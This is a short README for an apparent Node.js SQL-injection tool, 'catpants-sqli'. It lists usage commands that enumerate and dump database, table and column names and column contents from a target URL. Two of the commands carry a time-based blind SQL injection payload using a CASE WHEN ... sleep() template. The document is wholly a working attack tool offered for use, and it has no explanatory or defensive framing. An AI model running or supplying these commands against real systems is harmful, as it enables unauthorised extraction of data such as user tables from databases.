# catpants-sqli
## Usage
* `node . dump-db-names -u "http://192.168.0.1" -d "name=1{CATPANTS}"`
* `node . dump-table-names -u "http://192.168.0.1" -d "name=1{CATPANTS}" --db db_name`
* `node . dump-column-names -u "http://192.168.0.1" -d "name=1' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -" --db db_name --table users`
* `node . dump-table-column -u "http://192.168.0.1" -d "name=1' AND (CASE WHEN {{> query}} THEN sleep({{timeout}}) END)-- -" --db db_name --table users --column id`
